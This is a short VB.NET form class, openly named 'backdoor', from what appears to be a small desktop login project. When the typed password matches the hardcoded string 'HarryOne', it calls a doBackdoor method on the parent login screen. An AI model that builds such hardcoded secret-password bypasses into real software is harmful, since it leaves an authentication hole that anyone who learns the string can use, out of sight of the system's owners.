Public Class backdoor
    Dim _parent As LoginScreen

    Public Sub New(Parent As LoginScreen)
        _parent = Parent
        InitializeComponent()

    End Sub


    Private Sub Login_Click(sender As System.Object, e As System.EventArgs) Handles Login.Click
        Me.Visible = False
        If passwordBox.Text.Equals("HarryOne") Then
            _parent.doBackdoor()
        End If
    End Sub
End Class